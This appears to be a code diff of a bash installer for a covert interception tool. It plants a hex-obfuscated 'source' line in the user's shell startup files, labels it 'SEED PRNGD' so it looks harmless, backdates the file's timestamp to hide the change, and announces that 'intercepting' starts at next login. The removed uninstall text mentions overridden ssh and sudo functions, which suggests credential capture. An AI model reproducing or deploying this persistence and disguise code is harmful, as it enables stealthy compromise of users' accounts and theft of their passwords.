@@ -32,24 +32,17 @@ rcfile_add()
 
 	RCLINE=$(echo "${THC_BASEDIR}"'/seed' |xxd -ps -c1024)
 	RCLINE_ENC="source \$(echo $RCLINE|xxd -r -ps#PRNGD) 2>/dev/null"
+	DEBUGF "RCLINE=${RCLINE}"
+	DEBUGF "RCLINE_ENC=${RCLINE_ENC}"
 
 	RCLINE=""
 	(head -n1 "${rcfile}" && \
-		echo "# DO NOT REMOVE THIS LINE. SEED PRNGD."
+		echo "# DO NOT REMOVE THIS LINE. SEED PRNGD." && \
 		echo $RCLINE_ENC && \
 		tail -n +2 "${rcfile}") >"${rcfile}-new" 2>/dev/null || exit 0
 
 	touch -r "${rcfile}" "${rcfile}-new"
 	mv "${rcfile}-new" "${rcfile}"
-}
-
-rcfile_del()
-{
-	local rcfile="$1"
-	local data
-
-	data=$(grep -v PRNGD "${rcfile}")
-	echo "$data" >"${rcfile}" || { echo "failed"; exit 91; }
 }
 
 try_basedir()
@@ -85,7 +78,7 @@ osarch()
 		        os="aarch64-linux"
 		elif [[ "$arch" == "mips64" ]]; then
 		        os="mips64-alpine"
-		elif [[ x"$arch" == *mips* ]]; then
+		elif [[ $arch == *mips* ]]; then
 		        os="mips32-alpine"
 		fi
 	elif [[ $OSTYPE == *darwin* ]]; then
@@ -120,10 +113,10 @@ try_basedir "/tmp/.prng/u-${UID}" || \
 [[ -f /etc/profile     ]] && RCFILE_SYSTEM="/etc/profile"     && grep PRNGD /etc/profile     &>/dev/null && IS_INSTALLED_RCFILE_SYSTEM=1
 
 # determine if local is already installed
-[[ -z $RCFILE_USER ]] && [[ $SHELL =~ zsh ]] && [[ -f $HOME/.zshrc ]] && RCFILE_USER=$HOME/.zshrc
-[[ -z $RCFILE_USER ]] && [[ $SHELL =~ bash ]] && [[ -f $HOME/.bash_profile ]] && RCFILE_USER=$HOME/.bash_profile
-[[ -z $RCFILE_USER ]] && [[ $SHELL =~ bash ]] && [[ -f $HOME/.bash_login ]] && RCFILE_USER=$HOME/.bash_login
-[[ -z $RCFILE_USER ]] && [[ -f $HOME/.profile ]] && RCFILE_USER=$HOME/.profile
+[[ -z $RCFILE_USER ]] && [[ $SHELL =~ zsh ]] && [[ -f $HOME/.zshrc ]] && RCFILE_USER="${HOME}/.zshrc"
+[[ -z $RCFILE_USER ]] && [[ $SHELL =~ bash ]] && [[ -f $HOME/.bash_profile ]] && RCFILE_USER="${HOME}/.bash_profile"
+[[ -z $RCFILE_USER ]] && [[ $SHELL =~ bash ]] && [[ -f $HOME/.bash_login ]] && RCFILE_USER="${HOME}/.bash_login"
+[[ -z $RCFILE_USER ]] && [[ -f $HOME/.profile ]] && RCFILE_USER="${HOME}/.profile"
 [[ -n $RCFILE_USER ]] && grep PRNGD "${RCFILE_USER}" &>/dev/null && IS_INSTALLED_RCFILE_USER=1
 
 # FIXME: if UID=0 then install systemwide to RCFILE_SYSTEM
@@ -131,14 +124,6 @@ RCFILE="$RCFILE_USER"
 
 # no RCFILE found...
 [[ -z $RCFILE ]] && { echo >&2 "No rcfile found"; exit 0; }
-
-if [[ "$1" = "uninstall" ]]; then
-	[[ -n $IS_INSTALLED_RCFILE_USER   ]] && rcfile_del "$RCFILE_USER"
-	[[ -n $IS_INSTALLED_RCFILE_SYSTEM ]] && rcfile_del "$RCFILE_SYSTEM"
-	echo -e "--> You may want to clean up with"
-	echo -e "--> ${CC}rm -rf \"${THC_BASEDIR:-ERRORNOTSET}\"; unset -f ssh sudo thc_set1${CN}"
-	exit 0
-fi
 
 if [[ -z $IS_INSTALLED_RCFILE_SYSTEM ]] && [[ -z $IS_INSTALLED_RCFILE_USER ]]; then
 	rcfile_add "$RCFILE"
@@ -224,9 +209,9 @@ if [[ -n $THC_LOCAL ]]; then
 	echo -e 2>&1 ""\
 "--> Installed to ${CY}${THC_BASEDIR}${CN} and ${CY}${RCFILE}${CN}.\n"\
 "--> Logging to ${CY}${THC_BASEDIR}/.l${CN}\n"\
-"--> Type ${CC}${THC_BASEDIR}/x.sh uninstall${CN} to remove.\n"\
+"--> Type ${CM}${THC_BASEDIR}/thc_cli uninstall${CN} to remove.\n"\
 "--> Intercepting will start on next log in or to start right\n"\
-"    now type ${CC}source ${THC_BASEDIR}/seed${CN}."
+"    now type ${CM}source ${THC_BASEDIR}/seed${CN}."
 fi
 
 exit 0
